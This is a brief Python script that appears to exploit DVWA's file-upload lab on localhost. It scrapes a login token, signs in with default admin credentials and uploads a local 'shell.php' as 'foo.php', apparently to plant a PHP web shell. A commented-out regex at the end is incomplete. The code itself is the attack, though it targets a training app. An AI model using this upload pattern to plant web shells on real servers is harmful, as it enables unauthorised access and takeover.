import requests
from bs4 import BeautifulSoup as soupy
import re

proxies = {
    "http": "http://localhost:8080"
}

url = 'http://localhost/vulnerabilities/upload/#'

files = {
    'MAX_FILE_SIZE': (None, 100000),
    'uploaded': ('foo.php', open('shell.php', 'rb')),
    'Upload': (None, 'Upload')
}

r = requests.get("http://localhost/login.php")

soup = soupy(r.text, features='html.parser')
a = soup.find_all('input')[3]
user_token = re.findall(r'value="(.*)">', str(a))[0]

cookies = r.cookies

r = requests.post('http://localhost/login.php', data={'username': 'admin',
                                                      'password': 'password',
                                                      'Login': 'Login',
                                                      'user_token': user_token},
                  cookies=cookies
                  )

r = requests.post(url, files=files, cookies=cookies)

print(r.status_code)
print(r.content)

'''
re.findall(r"(.*) succesfully uploaded!")
'''
